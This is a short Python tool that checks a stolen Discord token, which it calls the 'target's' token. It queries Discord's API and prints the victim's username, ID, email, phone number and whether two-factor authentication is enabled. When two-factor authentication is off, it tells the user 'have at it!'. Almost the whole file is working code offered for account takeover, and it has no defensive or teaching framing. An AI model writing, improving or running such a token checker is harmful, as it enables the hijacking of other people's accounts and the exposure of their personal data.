#!/usr/bin/python3
import pkg_resources, os, sys, subprocess
from sys import platform

# Checking if there are missing packages.
required = {'requests', 'argparse'}
installed = {pkg.key for pkg in pkg_resources.working_set}
missing = required-installed 

# Ensure the valid OS.
def check_os(python):
	if platform == "linux":
		os.system("pip3 install requests argparse --user")
	elif platform == "win32":
		subprocess.check_call([python, '-m', 'pip', 'install', *missing])
	return "[+] Installed all packages"

# Installs missing packages.
def install_missing():
	if missing:
		python = sys.executable
		check_os(python)
	else:
		pass

# Import the packages that were installed or already installed
import requests, json, argparse, time

# Parsing arguments.
parser = argparse.ArgumentParser()

# Adding arguments.
parser.add_argument("t", help="Discord token of the target", metavar="TOKEN")

# Read arguments from command line.
args = parser.parse_args()

# Base variables
url = "https://discord.com/api/v6/users/@me"
h = {"Authorization": args.t} # headers
r = requests.get(url, headers=h) # GET request to Discord API

# Check the token
def check_token():
	if r.status_code == 200:
		print("\n[+] Token passed verification check... gathering info")
		time.sleep(2)
	else:
		print("[!] Token invalid " + f"({r.status_code} Error)")
		sys.exit()

# Gather info
def gather_info():
	data = r.json()
	print(f"[+] Account: {data['username']}#{data['discriminator']} - {data['id']}")
	if data['verified'] == True:
		print(f"[+] Email: {data['email']} - Verified")
	else:
		print(f"[+] Email: {data['email']} - Not verified")
	print(f"[+] Phone Number: {data['phone']}")
	if data['mfa_enabled'] == True:
		print(f"[+] GAuth is enabled")
	else:
		print(f"[+] GAuth is disabled, have at it! :D")

def main():
	install_missing()
	time.sleep(2)
	check_token()
	gather_info()
	print("\n~ valentine\n")

if __name__ == "__main__":
	main()